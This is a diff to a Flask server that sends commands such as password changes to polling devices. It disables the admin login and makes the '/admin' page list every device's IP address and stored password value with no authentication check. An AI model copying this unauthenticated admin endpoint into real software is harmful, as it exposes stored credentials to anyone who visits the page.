@@ -229,9 +229,11 @@ def poll_commands():
     # Get IP address of the device
     device_ip = request.remote_addr
     # Ensure that device is in the DB and update last seen time
-    status, message = ensure_device_active(device_ip, DEVICE_TIMEOUT_SECONDS, redis_client)
+    status, message, dict_response = ensure_device_active(device_ip, DEVICE_TIMEOUT_SECONDS, redis_client)
     if not status:
         return jsonify({'error': message}), 400
+    if dict_response:
+        return dict_response
     
     # Get the command from the DB
     command_data_json = redis_client.get(f"device_command:{device_ip}")
@@ -247,6 +249,7 @@ def poll_commands():
     elif command_data["command"] == 'change_password':
         commands = {'command': command_data["command"], 'new_password': command_data["params"]["new_password"]}
     elif command_data["command"] == 'rickroll':
+        # TODO: Implement rickroll command
         pass
     elif command_data["command"] == 'display_password':
         commands = {'command': command_data["command"]}
@@ -254,8 +257,6 @@ def poll_commands():
         commands = {'command': command_data["command"]}
     else:
         return jsonify({'error': 'Invalid command'}), 400
-
-    # TODO: Leave easter egg for playing rickroll or something. It would be a new command like 'rickroll'
 
     return jsonify(commands)
     
@@ -286,63 +287,99 @@ def list_view():
             })
     return jsonify({'endpoints': endpoints})
 
-@app.route('/admin_login', methods=['GET', 'POST'])
-def admin_login():
-    if request.method == 'GET':
-        return render_template('admin_login.html')
-    if request.method == 'POST':
-        # Get the form data
-        ip_address = request.form.get('ip_address')
-        # Confirm that the IP address is in the database and that it is active
-        redis_key = f"device:{ip_address}"
-        device_data = redis_client.get(redis_key)
-        if not device_data:
-            flash("Device not found")
-            return render_template('admin_login.html')
+# OLD CODE BELOW
+# @app.route('/admin_login', methods=['GET', 'POST'])
+# def admin_login():
+#     if request.method == 'GET':
+#         return render_template('admin_login.html')
+#     if request.method == 'POST':
+#         # Get the form data
+#         ip_address = request.form.get('ip_address')
+#         # Confirm that the IP address is in the database and that it is active
+#         redis_key = f"device:{ip_address}"
+#         device_data = redis_client.get(redis_key)
+#         if not device_data:
+#             flash("Device not found")
+#             return render_template('admin_login.html')
         
-        # Confirm device is active
-        status, message = check_last_seen(ip_address, DEVICE_TIMEOUT_SECONDS, redis_client)
-        if not status:
-            flash("Error occured: " + message)
-            return render_template('admin_login.html')
+#         # Confirm device is active
+#         status, message = check_last_seen(ip_address, DEVICE_TIMEOUT_SECONDS, redis_client)
+#         if not status:
+#             flash("Error occured: " + message)
+#             return render_template('admin_login.html')
 
-        # Get the device data
-        device_data = json.loads(device_data)
-        session['admin'] = True
-        session['device_ip'] = ip_address
+#         # Get the device data
+#         device_data = json.loads(device_data)
+#         session['admin'] = True
+#         session['device_ip'] = ip_address
         
-        return redirect(url_for('admin'))
+#         return redirect(url_for('admin'))
 
-@app.route('/admin_logout', methods=['GET'])
-def admin_logout():
-    # Clear the session
-    session.clear()
-    return redirect(url_for('admin_login'))
+# @app.route('/admin_logout', methods=['GET'])
+# def admin_logout():
+#     # Clear the session
+#     session.clear()
+#     return redirect(url_for('admin_login'))
+
+# @app.route('/admin', methods=['GET'])
+# def admin():
+#     # Check if the user is an admin
+#     if 'admin' not in session or session['admin'] != True:
+#         flash("Hah! You though we were that dumb? No you have to sign in first!")
+#         return redirect(url_for('admin_login'))
+    
+#     # Query database for password for the device
+#     device_ip = session['device_ip']
+#     redis_key = f"device:{device_ip}"
+#     device_data = redis_client.get(redis_key)
+#     if not device_data:
+#         flash("Device not found")
+#         return redirect(url_for('index'))
+    
+#     # Get the device data
+#     device_data = json.loads(device_data)
+#     password = device_data.get('password')
+#     if not password:
+#         flash("Device not found")
+#         return redirect(url_for('index'))
+    
+#     # Render page that shows the info they want.
+#     return render_template('admin.html', device_ip=device_ip, password=password)
 
 @app.route('/admin', methods=['GET'])
 def admin():
-    # Check if the user is an admin
-    if 'admin' not in session or session['admin'] != True:
-        flash("Hah! You though we were that dumb? No you have to sign in first!")
-        return redirect(url_for('admin_login'))
+    # Get all device keys from Redis
+    device_keys = redis_client.keys('device:*')
+    if not device_keys:
+        flash("No devices found")
+        return render_template('admin.html', devices={})
     
-    # Query database for password for the device
-    device_ip = session['device_ip']
-    redis_key = f"device:{device_ip}"
-    device_data = redis_client.get(redis_key)
-    if not device_data:
-        flash("Device not found")
-        return redirect(url_for('index'))
-    
-    # Get the device data
-    device_data = json.loads(device_data)
-    password = device_data.get('password')
-    if not password:
-        flash("Device not found")
-        return redirect(url_for('index'))
+    devices = []
+    for key in device_keys:
+        device_data = redis_client.get(key)
+        if device_data:
+            device_data = json.loads(device_data)
+            key = str(key)
+            ip_address = key.split(':')
+            if not ip_address:
+                continue
+            ip_address = ip_address[1].replace("'", "")
+            # Remove inactive devices
+            status, message = check_last_seen(ip_address, DEVICE_TIMEOUT_SECONDS, redis_client)
+            if not status:
+                # Remove device from Redis
+                status, message = remove_device_database(ip_address, redis_client)
+                continue
+            # Prepare device data
+            device_info = {
+                'ip_address': ip_address,
+                'password_hash': device_data.get('password'),
+                'last_hacked_time': device_data.get('last_hacked_time', 'N/A')
+            }
+            devices.append(device_info)
     
     # Render page that shows the info they want.
-    return render_template('admin.html', device_ip=device_ip, password=password)
+    return render_template('admin.html', devices=devices)
 
 @app.route('/about', methods=['GET'])
 def about():
